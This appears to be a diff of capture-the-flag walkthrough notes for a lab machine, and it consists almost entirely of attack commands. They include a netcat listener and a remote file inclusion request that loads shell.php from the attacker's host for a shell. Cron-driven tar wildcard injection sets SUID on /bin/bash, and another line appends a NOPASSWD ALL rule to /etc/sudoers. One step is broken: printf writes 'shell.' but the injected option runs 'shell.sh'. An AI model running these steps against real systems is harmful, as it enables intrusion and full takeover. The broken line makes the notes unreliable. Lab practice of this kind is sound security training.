@@ -279,7 +279,9 @@ nc -lvnp 1234
 3 - MAKE THE FOLLOWING REQUEST IN THE WEB BROWSER BAR TO EXPLOIT RFI
 http://10.10.116.94/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.71.50:8000/shell.php
 
-4 - NOW HAVE A SHELL AS USER! Read the user flag!
+4 - Connected as USER! Read the user flag!
+
+python -c 'import pty;pty.spawn("/bin/bash")'	- VERY IMPORTANT - UPGRADE YOUR DUMB SHELL TO A TTY SHELL WITH PYTHON
 
 ----------------------------------------------------------------------------------------
 
@@ -287,4 +289,49 @@ Now to get root!
 
 
 
+
+cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+*/1 *	* * *   root	/home/milesdyson/backups/backup.sh
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+-----------------------
+EXPLOIT METHOD
+
+-----------------------
+FIRST CRONTAB METHOD
+navigate to /var/www/html
+
+printf '#!/bin/bash\nchmod +s /bin/bash' > shell.
+echo "" > "--checkpoint-action=exec=sh shell.sh"
+echo "" >> --checkpoint=1
+-----------------------------------------------------------
+
+or
+SECOND CRONTAB METHOD
+echo 'echo "www-data ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > sudo.sh
+touch "/var/www/html/--checkpoint-action=exec=sh sudo.sh"
+touch "/var/www/html/--checkpoint=1"
+
+then wait a minute for cron job to execute
+then use following command to get root access:
+
+sudo su			
+
+
+WE HAVE ROOT FLAG!
+
+---------------------------------------------------------------
 
